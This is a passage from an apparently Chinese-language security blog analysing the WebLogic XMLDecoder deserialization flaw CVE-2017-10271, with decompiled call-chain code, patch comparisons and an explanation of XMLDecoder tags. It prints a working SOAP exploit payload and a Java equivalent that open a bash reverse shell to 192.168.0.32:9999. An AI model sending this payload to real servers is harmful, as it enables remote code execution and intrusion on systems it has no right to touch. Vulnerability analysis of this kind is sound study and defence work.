class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> NextAction <span class="title function_">processRequest</span><span class="params">(Packet var1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.isUseOldFormat = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (var1.getMessage() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">HeaderList</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getMessage().getHeaders();</span><br><span class="line">            <span class="type">Header</span> <span class="variable">var3</span> <span class="operator">=</span> var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (var3 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.readHeaderOld(var3);</span><br><span class="line">                <span class="built_in">this</span>.isUseOldFormat = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Header</span> <span class="variable">var4</span> <span class="operator">=</span> var2.get(<span class="built_in">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.readHeader(var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.processRequest(var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-5.png"><br>var1为POST传进来的XML数据，var3是xml的头部解析，如果存在（头不为空），就进入readHeaderOld()方法，跟进readHeaderOld()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">readHeaderOld</span><span class="params">(Header var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">XMLStreamReader</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readHeader();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        <span class="type">XMLStreamReaderToXMLStreamWriter</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLStreamReaderToXMLStreamWriter</span>();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">XMLStreamWriter</span> <span class="variable">var5</span> <span class="operator">=</span> XMLStreamWriterFactory.create(var4);</span><br><span class="line">        var3.bridge(var2, var5);</span><br><span class="line">        var5.close();</span><br><span class="line">        <span class="type">WorkContextXmlInputAdapter</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkContextXmlInputAdapter</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(var4.toByteArray()));</span><br><span class="line">        <span class="built_in">this</span>.receive(var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var8);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一步processRequest中我们只把头读了进来，其他的数据还在缓冲区中，使用ByteArrayOutputStream函数读取剩余数据到var4。经过一系列的处理后，如果没有问题就创建WorkContextXmlInputAdapter对象 var6，之后跟进receive()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">receive</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">WorkContextMapInterceptor</span> <span class="variable">var2</span> <span class="operator">=</span> WorkContextHelper.getWorkContextHelper().getInterceptor();</span><br><span class="line">    var2.receiveRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进receiveRequest()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">receiveRequest</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    ((WorkContextMapInterceptor)<span class="built_in">this</span>.getMap()).receiveRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将var1传到了receiveRequest()方法中，继续跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">receiveRequest</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WorkContextEntry</span> <span class="variable">var2</span> <span class="operator">=</span> WorkContextEntryImpl.readEntry(var1);</span><br><span class="line">            <span class="keyword">if</span> (var2 == WorkContextEntry.NULL_CONTEXT) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">            <span class="built_in">this</span>.map.put(var3, var2);</span><br><span class="line">            <span class="keyword">if</span> (debugWorkContext.isDebugEnabled()) &#123;</span><br><span class="line">                debugWorkContext.debug(<span class="string">&quot;receiveRequest(&quot;</span> + var2.toString() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var4) &#123;</span><br><span class="line">            <span class="keyword">if</span> (debugWorkContext.isDebugEnabled()) &#123;</span><br><span class="line">                debugWorkContext.debug(<span class="string">&quot;receiveRequest : &quot;</span>, var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进 readEntry </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> WorkContextEntry <span class="title function_">readEntry</span><span class="params">(WorkContextInput var0)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var1</span> <span class="operator">=</span> var0.readUTF();</span><br><span class="line">    <span class="keyword">return</span> (WorkContextEntry)(var1.length() == <span class="number">0</span> ? NULL_CONTEXT : <span class="keyword">new</span> <span class="title class_">WorkContextEntryImpl</span>(var1, var0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里对var0执行了readUTF()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">readUTF</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">return</span> (String)<span class="built_in">this</span>.xmlDecoder.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行了readObject()方法，对XMLDecoder对象进行了反序列化，导致远程命令执行。</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="https://www.anquanke.com/post/id/102768">https://www.anquanke.com/post/id/102768</a></p><p>接下来我们详细剖析下payload的原理</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">                                /bin/bash</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">                                -c</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">                                bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用 SOAP 请求或者更具体地为什么在 WebLogic 中使用 SOAP，关联到了几个重要的点：Web服务的标准、WebLogic 服务器的功能以及企业级应用的需要。下面是这些关系的详细解释：</p><ol><li><strong>SOAP 和 Web 服务标准</strong><br>SOAP（Simple Object Access Protocol）是一种协议规范，用于在网络上交换结构化信息，它建立在 XML 协议之上，使其能够与任何系统的任何编程语言进行交互，这对于异构系统的集成非常重要。SOAP 定义了如何通过网络传输信息：</li></ol><ul><li><strong>独立于平台和语言</strong>：SOAP 提供了一种方式，允许不同操作系统和编程语言之间进行通信，这对于多种技术堆栈的企业环境至关重要。</li><li><strong>支持复杂的交互模式</strong>：与简单的 REST 相比，SOAP 支持更复杂的交互和更强的安全性，包括事务管理和双向操作。</li></ul><ol start="2"><li><strong>WebLogic 服务器和 Web 服务</strong><br>WebLogic 是 Oracle 的一个企业级应用服务器，它提供了全面的支持用于开发、集成和部署企业级的 Java EE 应用。WebLogic 服务器提供的特性之一就是对 Web 服务的优秀支持，包括：</li></ol><ul><li><strong>SOAP 支持</strong>：WebLogic 提供对 SOAP Web 服务的原生支持。它能够承载使用 SOAP 协议的服务，处理 SOAP 消息，并进行必要的安全和事务处理。</li><li><strong>WS-Security</strong>：SOAP 的安全扩展（WS-Security）提供了一种机制来保证 SOAP 消息的安全，这是企业级应用所需的。WebLogic 支持这些标准，确保数据传输的安全性。</li></ul><ol start="3"><li><strong>企业级应用的需要</strong><br>在企业级应用中，常常需要保证数据的安全传输和可靠性：</li></ol><ul><li><strong>可靠性和事务性</strong>：企业级应用通常要求数据传输必须是可靠的和具备事务性的，SOAP 提供了 WS-ReliableMessaging 和 WS-AtomicTransaction 等规范支持，这些都是 REST 很难完整提供的。</li><li><strong>服务描述</strong>：SOAP 使用 WSDL (Web Services Description Language) 描述服务接口，这对于企业级服务的自动发现和集成非常重要。</li></ul><ol start="4"><li><strong>WebLogic 中的 SOAP 利用漏洞</strong><br>正因为 WebLogic 服务器广泛地支持使用 SOAP 进行复杂的 Web 服务交互，所以一旦这些处理机制中存在缺陷，它们就成为了攻击者的目标。例如，CVE-2017-10271 就是利用了 WebLogic 在解析 SOAP 请求时处理 XML 输入的方式中的漏洞。</li></ol><p>ProcessBuilder是什么? ，ProcessBuilder类是J2SE1.5在java.lang中新添加的一个新类，此类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法。说白了它能执行本地命令，但是它提供的功能更加丰富,能够设置工作目录、环境变量。<br>将上面的payload转化为java代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.ProcessBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 ProcessBuilder 实例</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(commands);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 启动进程</span></span><br><span class="line">            processBuilder.start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">    <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">        parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">                <span class="keyword">if</span> (qName.equalsIgnoreCase(“object”)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> newIllegalStateException(“Invalid context type: object”);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(“Parser Exception”, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(“Parser Exception”, var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(“Parser Exception”, var7);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个是CVE-2017-3506的补丁，再对xml解析时，如果qName的值是Object时将抛出异常，采用的黑名单的方式。所以就出现了今天的分析的CVE-2017-10271。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, StringlocalName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">        <span class="keyword">if</span> (qName.equalsIgnoreCase(“object”)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> newIllegalStateException(“Invalid element qName: object”);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(“<span class="keyword">new</span>”)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> newIllegalStateException(“Invalid element qName: <span class="keyword">new</span>”);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(“method”)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> newIllegalStateException(“Invalid element qName: method”);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(“<span class="keyword">void</span>”)) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">attClass</span> <span class="operator">=</span> <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!”index”.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> newIllegalStateException(“Invalid attribute</span><br><span class="line">                            <span class="keyword">for</span> element <span class="keyword">void</span>: ”+attributes.getQName(attClass));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是CVE-2017-10271补丁，分别对 Object new method void进行了判断,进行了防护。导致poc攻击失效。</p><h2 id="漏洞根源"><a href="#漏洞根源" class="headerlink" title="漏洞根源"></a>漏洞根源</h2><p>其实主要还是 XMLDecoder 的问题，<code>XMLDecoder</code> 是 Java Beans 中用于从 XML 文档中恢复 Java 对象图的一个工具。它是专为解码通过 <code>XMLEncoder</code> 编码的 XML 文档而设计的，但也可用于处理其他符合格式的 XML。<code>XMLDecoder</code> 主要处理以下几种类型的标签：</p><ol><li><code>&lt;object&gt;</code><br>这个标签用于创建一个对象的实例。它通常包含 <code>class</code> 属性来指定要实例化的类。这是最基本的用于实例化对象的标签。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.util.Date&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;java&gt;</code><br>这个标签是用于封装整个 Java 对象序列化数据的根元素，提供了一个环境来指定 Java 版本和类定义。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;array&gt;</code><br>用于表示一个数组，通常包含 <code>class</code> 和 <code>length</code> 属性，用于指定数组的元素类型及长度。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;void&gt;</code><br>这是一个多功能的标签，用于表示不返回值的方法调用或属性设置。例如，它可用于调用方法或设置对象的属性。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>John Doe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;add&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Integer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>100<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;value&gt;</code><br>用于包装简单值或字符串，通常内嵌在其他标签中，用于设置属性或数组值。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>123<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;null&gt;</code><br>用于表示 null 值，常见于设置可为空的属性或对象引用。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;string&gt;</code><br>用于表示字符串值，经常用于属性赋值或方法参数。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>Example<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;int&gt;</code>, <code>&lt;boolean&gt;</code>, <code>&lt;float&gt;</code>, <code>&lt;double&gt;</code> 等<br>用于表示基本数据类型的值。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">int</span>&gt;</span>42<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;list&gt;</code><br>用于创建 <code>List</code> 类型的集合。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p><code>XMLDecoder</code> 的设计初衷是用于 JavaBeans 组件的配置和存储，因此它在解析时会创建并操作 Java 对象。由于其灵活性，<code>XMLDecoder</code> 可以被用来执行复杂的操作，包括调用任意方法，这可能导致安全问题。因此，使用 <code>XMLDecoder</code> 处理不受信任的 XML 数据时必须非常小心。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法】栈与队列</title>
      <link href="/2024/10/22/algorithm/stackandqueue/"/>
      <url>/2024/10/22/algorithm/stackandqueue/</url>
      
